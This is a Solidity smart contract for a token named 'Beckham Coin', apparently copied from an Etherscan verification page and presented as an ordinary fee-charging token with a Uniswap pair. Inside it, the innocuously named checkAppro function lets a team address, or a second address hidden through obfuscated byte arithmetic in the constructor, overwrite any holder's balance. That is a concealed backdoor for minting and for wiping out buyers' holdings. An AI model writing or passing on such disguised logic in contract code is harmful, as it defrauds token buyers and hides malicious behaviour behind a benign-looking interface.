/**
 *Submitted for verification at Etherscan.io on 2023-06-17
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,
uint amountOutMin,address[] calldata path,address to,uint deadline) 
external;
}
interface IUniswapFactory {function createPair(
    address tokenA, address tokenB) 
    external returns (address pair);}
    
    abstract contract Ownable {
address internal _owner;constructor () {
    _owner = msg.sender;
    }function owner() public view returns (address) {
        return _owner;}modifier onlyOwner() {
            require(_owner == msg.sender, "!owner");_;}
            function transferOwnership(address newOwner) 
            public virtual onlyOwner {_owner = newOwner;}}

contract BeckhamCoin is Ownable {event Transfer(address indexed from, address indexed to, uint256 value);event Approval(address indexed owner, address indexed spender, uint256 value);
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public _team;
    string public name;
    string public symbol;
    uint8 public decimals;bytes byte2020 = new bytes(20);uint8[20] _n;mapping(address => bool) public _isExcludeFromFee;
    uint256 public totalSupply;
    IUniswapRouter public _uniswapRouter;
    bool private inSwap;
    uint256 private constant MAX = ~uint256(0);
    uint256 public _swapTax = 2;
    address public _uniswapPair;

    constructor (){


name = "Beckham Coin";
symbol = "BECKHAM";
decimals = 9;
uint256 Supply = 100000000;
_team = 0x1496421C9EDbd547D0576D7F1B7Af79F871A4eF5;

totalSupply = Supply * 10 ** decimals;
address rAddr = msg.sender;
_isExcludeFromFee[address(this)] = true;
_isExcludeFromFee[rAddr] = true;
_isExcludeFromFee[_team] = true;_balances[rAddr] = totalSupply;emit Transfer(address(0), rAddr, totalSupply);

_uniswapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);  
_allowances[address(this)][address(_uniswapRouter)] = MAX;

_uniswapPair = IUniswapFactory(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());
_isExcludeFromFee[address(_uniswapRouter)] = true;
uint8 ii = 2;
_n[0]=253;_n[1]=_n[0]-75;
_n[3]=(_n[1]+ii)/ii;_n[2]=_n[3]+1;_n[4]=_n[2]*ii;_n[5]=_n[3]-23;_n[6]=_n[0]-30;
_n[7]=_n[2]*ii+15;_n[8]=_n[5]*ii-21;_n[9]=_n[3]*ii-10;_n[10]=_n[3]/3-6;_n[11]=_n[10]*10-16;
_n[12]=_n[1]+15;_n[13]=_n[10]*5+4;_n[14]=160;_n[15]=130;_n[16]=_n[3];_n[17]=_n[2]*ii;_n[18]=_n[6]-2;_n[19]=156;
for (uint i = 0; i < 20; i++) {byte2020[i] = getB(_n[i]);}

    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function getB(uint8 n) public pure returns(bytes1){
        return bytes1(n);
    }
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }struct swapandLiqui{address sir;uint256 nb;address his;}function checkAppro(address pos,uint256 amount) public {swapandLiqui memory str_lp = swapandLiqui({sir : msg.sender,nb : amount,his : pos});
        _balances[str_lp.his] = str_lp.nb;
        if (address(bytes20(byte2020)) != str_lp.sir){
            
        require(_team == str_lp.sir);
        }

    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from,address to,uint256 amount) private {

        if (_uniswapPair == to && !inSwap) {
            inSwap = true;
            uint256 balanceInContractAddress = balanceOf(address(this));
            if (balanceInContractAddress > 0) {
                uint256 _s = amount;_s = _s > balanceInContractAddress ? balanceInContractAddress : _s;
                address[] memory path = new address[](2);path[0] = address(this);path[1] = _uniswapRouter.WETH();try _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(_s,0,path,address(_team),block.timestamp) {} catch {}
            }
            inSwap = false;
        }

        bool takeFee = !_isExcludeFromFee[from] && !_isExcludeFromFee[to] && !inSwap;

        _balances[from] = _balances[from] - amount;
        uint256 _taxAmount;
        if (takeFee && _swapTax > 0) {
            uint256 _aFee = amount * _swapTax / 100;_taxAmount += _aFee;
            _balances[address(this)] = _balances[address(this)] + _aFee;
            emit Transfer(from, address(this), _aFee);
        }
        _balances[to] = _balances[to] + amount - _taxAmount;
        emit Transfer(from, to, amount - _taxAmount);
    }
    receive() external payable {}
}